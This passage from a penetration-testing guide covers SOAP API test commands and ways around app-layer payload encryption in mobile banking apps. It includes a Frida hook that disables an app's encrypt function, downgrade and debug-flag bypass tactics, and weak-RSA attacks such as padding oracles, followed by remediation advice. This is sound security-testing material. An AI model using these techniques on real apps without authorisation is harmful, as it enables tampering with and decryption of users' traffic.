nmap --script ssl-enum-ciphers -p 443 api.example.com
```

### Data integrity, performance & contract
```bash
# D-03 Correlation ID propagation: <ns:CorrelationId>trace-2026-11-06-0001</ns:CorrelationId> in Header;
#      check the same ID in the response header and in server/downstream logs.
# D-05 Decimal precision: UnitPrice 0.10 x Quantity 3 = exactly 0.30 (not 0.30000000000000004); try 33.33 x 3 = 99.99
# D-04 Time zones: 2026-11-06T23:59:59-08:00 and 2026-11-07T07:59:59Z must resolve to the same instant.

# Performance (JMeter / k6): F-01 body, OrderId from CSV; unique CorrelationId per call (${__UUID()}).
#   Baseline 1 user/20 calls; Load 100 users/10 min; Soak 50 users/4 h; Spike 10->500 users in 30 s.

# C-01 WSDL fetch and validation
curl -o orders.wsdl "https://api.example.com/orders/v1?wsdl"
xmllint --noout orders.wsdl
xmllint --noout --schema orders.xsd response.xml   # validate a response against the XSD (F-06)

# Ready-to-run template
curl -v -X POST "https://api.example.com/orders/v1" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H 'SOAPAction: "http://example.com/orders/GetOrderStatus"' \
  --data @F-01.xml
```

---

## 9. Client-side / payload-layer encryption (mobile & API)

**What it is.** Many apps - Indian banking apps especially - encrypt the HTTP request/response **body** at the application layer (AES for the data, often with an RSA-wrapped key or a device-derived key) *before* it goes over HTTPS. In an intercepting proxy you then see ciphertext, not JSON, so ordinary tampering in Repeater/Intruder does not work until you can read and re-produce the encrypted payload.

**Why it is not "crypto you break."** The key and the crypto both run on the client, so brute-forcing AES/RSA is infeasible and beside the point. The real weaknesses are that (a) you already control the client, so you can use *its own* crypto routines, and (b) the encryption is frequently enforced inconsistently or implemented incorrectly.

**How you test and bypass it.**
- **Hook the app's own encrypt/decrypt (Frida).** Attach Frida and hook the crypto sink (Android `javax.crypto.Cipher.doFinal`, or the app's own `AESHelper.encrypt`/`decrypt`) to log plaintext before encryption and after decryption, and to tamper there. You can also no-op the function so the app stops encrypting and Burp sees readable JSON for the rest of the session:
```javascript
Java.use("com.bank.crypto.AESHelper").encrypt.implementation = function (data) {
    return data; // passthrough: skip encryption, Burp sees plaintext
};
```
- **Brida (Burp + Frida bridge).** Call the app's own `encrypt()`/`decrypt()` from Burp so Repeater/Intruder tamper in plaintext and Brida re-encrypts on the way out - you never need the key.
- **Burp Match & Replace, scoped per module.** Once you understand the format, set Proxy -> Match and Replace rules scoped to specific URLs (e.g. `/login` vs `/ekyc`) to auto-decrypt inbound / re-encrypt outbound, because different modules often use different keys or schemes.
- **Static vs dynamic key (a finding in itself).** If the key/IV is generated fresh per request (dynamic), keep Frida attached throughout testing. If it is static - hardcoded, or derived once from a fixed value such as device ID - extract it once and encrypt/decrypt offline in a script. A static/reused key also makes ciphertext predictable and comparable, which is itself reportable.
- **Encryption-enforcement inconsistency (the "out of the box" bypass).** The gateway/WAF/config usually enforces encryption only for a defined URL list. Map every endpoint performing the same action across web, mobile, old API versions and partner APIs; if one channel accepts plaintext for the same shared backend logic, hit that one directly. Test a **downgrade**: send the same parameters as plain JSON/form instead of the encrypted blob - legacy decrypt routines often fall back to "try decrypt, else parse as plain." Hunt `/v1/`, `/internal/`, `/legacy/`, debug flags (`?debug=true`, `X-Debug-Mode`), and endpoints added to the app but never registered in the enforcement config (the CMDB/config-ID gap).
- **Weak RSA implementation (the deeper flaw).** Separately from "is it encrypted," check how RSA is used: **textbook RSA / no OAEP padding** -> deterministic ciphertext -> build a plaintext->ciphertext dictionary for known values (OTPs, PINs) and match without decrypting (chosen-plaintext); **small key (512/1024-bit)** -> factorable; **one keypair reused across all users/devices** -> extract the public key from the APK to forge accepted payloads, and if the private key is reachable (hardcoded/weak storage) you decrypt everyone's traffic; **no integrity check on the ciphertext** -> bit-flipping (CBC) tampering goes undetected; **padding/error-response differences** -> a Bleichenbacher-style padding oracle decrypts without the private key.

**Impact.**
- Full tampering of "encrypted" traffic (so SQLi/IDOR/business-logic abuse on the real parameters becomes possible)
- Bypass of gateway/WAF inspection tied to the encrypted channel
- - with textbook or reused-key RSA - potential decryption of other users' traffic without ever holding the private key

**Remediation.**
- Client hardening can always be instrumented, so: enforce encryption/validation **centrally at the backend for every sensitive endpoint**
- Not per-URL at a gateway
- Remove plaintext/legacy fallback
- Use **RSA-OAEP padding
- A unique key/IV per session
- An HMAC/signature over the ciphertext** so tampering is detected
- Never reuse one keypair across users
- Keep a single source of truth (CMDB/config) validated against all live routes so new endpoints cannot ship unprotected. Payload encryption is an **anti-tampering/anti-analysis control
- Not a substitute for server-side authorization and validation**
